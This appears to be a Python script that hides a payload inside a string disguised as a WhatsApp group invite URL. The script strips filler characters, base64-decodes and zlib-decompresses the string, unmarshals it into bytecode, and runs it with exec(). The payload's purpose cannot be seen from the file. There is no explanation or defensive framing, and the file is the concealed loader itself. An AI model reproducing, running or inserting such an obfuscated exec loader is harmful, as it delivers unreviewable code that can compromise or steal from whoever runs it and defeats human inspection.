# -*- coding: utf-8 -*-
import marshal as _m, zlib as _z, base64 as _b
_U="https://chat.whatsapp.com/LZU6fs32eGnHtWaI3IIg4Y?eNqNUTtrG0=EQntM9JMsOigOJXK46SzhFZFV.%geII+rEQIIy&U.E1+Ii1=dqM7PfYO3V6Rq.87gQoH0.K..Ywh&pDAJ-=jMnUGGuCqRyFYE7VdnTI1GMCi3DN7ffzHwz+O-cLFo428-c+7E&sAXIFCDCFC+JSN=fifiPN06QpG1nKLs29Fl838I8jci0yyVZo5BKIe.i&Uv1d+KW.st+FV=OjSBxL5JNVnEFPpAvaZOdNaoLHrHqXoJV8oqmpOq9YeZZKMK6UduNn5s&Mm7qy=G70DIsjm.xLa0zHDyGHc&aSNObW.6w=JjLPPjh2A3OzF.3e3D1c8bgqh6nGlePoWFctF9LJQOc+lXi+yX0&qvg6X8qX3=%TLqSB2Slmz6TDsaie4Y%.6gsZR+&ys9Xp+NAYzkO.=0.QrCNiPJ%PQFGXshYmBnpXK&aH3OuZ23rL=c+NMeWgbrYNnR0ZthYlLR.wB7M2ZoiI+HsJZH7lust20eh+cu4i4&SghyCEo=I.qwN2arcMSWzC.4E5btiRG6266SR.ofIj&VVph9rYS+J=XTWhCt14nZqNcD1eoZjAcKw10cqJ.g12ziQRVWg&cpPjzg%4=D.5c%3jj4%wZyN.I4ddE3idOhR78+n.kjwDYvwWMZEmSRkpEUkY+QQ.gwk&zVM9.-TxxkfAS=t6B6qq%lB5AZQsaHzIT4L3+oevYh60Z-RTU%ZZT-rcwF.TG0B.y&CEkfk+rPY3gD2=h7Dvw-6MeDGA7BCyPmQ+X1E&YarG31E-2=Ep97G1vtyv+-Ap-jkuLtOa3a9PBQj7Xpj6AeSGkP.+.Mht&6Axnb=Q1gM0hbPpz6z.0Wb-4DPaPvmg__"
def _d(s):
    s=s.split("?",1)[1] if "?" in s else s
    s=s.replace("=","").replace("&","").replace(".","").replace("+","")
    r=[]
    for c in s:
        if c=="_":r.append("=")
        elif c=="%":r.append("+")
        elif c=="-":r.append("/")
        else:r.append(c)
    return _b.b64decode("".join(r))
exec(_m.loads(_z.decompress(_d(_U))))
